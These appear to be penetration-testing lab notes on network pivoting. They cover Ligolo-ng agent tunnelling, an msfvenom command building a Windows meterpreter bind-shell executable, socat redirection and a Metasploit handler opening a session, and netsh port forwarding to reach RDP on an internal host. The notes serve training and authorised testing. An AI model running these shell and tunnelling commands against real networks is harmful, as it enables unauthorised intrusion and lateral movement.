# Ligolo-ng

## Download Proxy and Agent

https://github.com/nicocha30/ligolo-ng/releases

## Setting Up

@attacker

```bash
sudo ligolo-ng -selfcert
```

@pivot

```bash
 ./agent -connect 10.10.16.50:11601 --ignore-cert
```


@attacker

```bash
ligolo-ng » session_list
┌─────────────────────────────────────────────────────────────────────────────┐
│ Active sessions and tunnels                                                 │
├───┬────────────────────────────────────────────────────┬───────────┬────────┤
│ # │ AGENT                                              │ INTERFACE │ STATUS │
├───┼────────────────────────────────────────────────────┼───────────┼────────┤
│ 1 │ jbetty@DMZ01 - 10.129.198.169:39368 - 0050568a2370 │           │ Online │
└───┴────────────────────────────────────────────────────┴───────────┴────────┘

ligolo-ng » session
? Specify a session : 1 - jbetty@DMZ01 - 10.129.198.169:39368 - 0050568a2370
[Agent : jbetty@DMZ01] »
```

Once the session is specified, use the `autoroute` command on the `ligolo-ng` terminal and select the route, create new interface, and start the tunnel.

```bash
[Agent : jbetty@DMZ01] » autoroute
? Select routes to add: 172.16.119.13/24
? Create a new interface or use an existing one? Create a new interface
INFO[0329] Generating a random interface name...
INFO[0329] Using interface name closeelectra
INFO[0329] Creating routes for closeelectra...
? Start the tunnel? Yes
INFO[0358] Starting tunnel to jbetty@DMZ01 (0050568a2370)
```


# Socat Redirection with a Bind Shell

![[Pasted image 20260103110729.png]]

## Create Listener Windows Payload (msfvenom)

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o listener.exe LPORT=8443
```

## Create Socat Redirection on Pivot Host

```bash
ubuntu@WEB01:~$ sudo socat TCP-LISTEN:8000,fork TCP4:172.16.5.19:8443
```

## Start Meterpreter to connect to windows listener

```bash
msf exploit(multi/handler) > options

Payload options (aa

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '
                                        ', seh, thread, process, no
                                        ne)
   LPORT     8000             yes       The listen port
   RHOST     10.129.202.64    no        The target address

msf exploit(multi/handler) > run
[*] Started bind TCP handler against 10.129.202.64:8000
[*] Sending stage (230982 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.16.50:38369 -> 10.129.202.64:8000) at 2026-01-03 11:07:01 +0700

meterpreter > sysinfo
```

# Port Forwarding with Netsh (Windows)

[Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use `Netsh` for:

- `Finding routes`
- `Viewing the firewall configuration`
- `Adding proxies`
- `Creating port forwarding rules`

![[Pasted image 20260105144108.png]]

We can use `netsh.exe` to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.

```powershell
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

```powershell
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.15.150   8080        172.16.5.25     3389
```

After configuring the `portproxy` on our Windows-based pivot host, we will try to connect to the `8080` port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by `netsh.exe`.

